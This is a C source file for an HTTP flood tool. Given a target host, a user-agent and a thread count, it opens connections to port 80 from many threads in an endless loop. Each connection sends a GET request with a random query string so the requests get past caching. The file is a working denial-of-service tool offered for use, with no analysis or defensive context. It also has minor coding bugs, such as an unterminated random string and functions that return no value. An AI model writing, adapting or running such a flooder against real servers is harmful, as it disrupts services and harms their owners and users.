#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>

int sizeread;
char *tgtip;
char *useragent;
struct timeval tv;
struct sockaddr_in sa; 

char *make_get() {
 int a = rand() % (32 - 0) + 0;
 char *randem = malloc(a);
 memset(randem, 0, a);
 for(int i = 0; i < a; i++) {
  randem[i] = rand() % (0x7b - 0x61) + 0x61;
 }
 char *req = malloc(1024);
 sprintf(req, "GET /?q=%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", randem, tgtip, useragent);
 free(randem);
 return req;
}

int makesa() {
 struct hostent *host;
 host = gethostbyname(tgtip); 
 sa.sin_addr.s_addr = *((unsigned int *)host->h_addr);
 sa.sin_port = htons(80); 
 sa.sin_family = AF_INET;
}

void *dosg(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *req = make_get();
 if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
  send(fd, req, strlen(req), MSG_NOSIGNAL); 
 }
 free(req);
 close(fd);
}


int make_threads(int threadnum) {
 pthread_t threadg[threadnum]; 
 makesa();
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dosg, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
   dprintf(1, "sent %d requests\n", threadnum);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 4) {
  dprintf(1, "ip user-agent threads\n");
  return 0;
 }
 tgtip = argv[1];
 useragent = argv[2];
 make_threads(atoi(argv[3]));
}
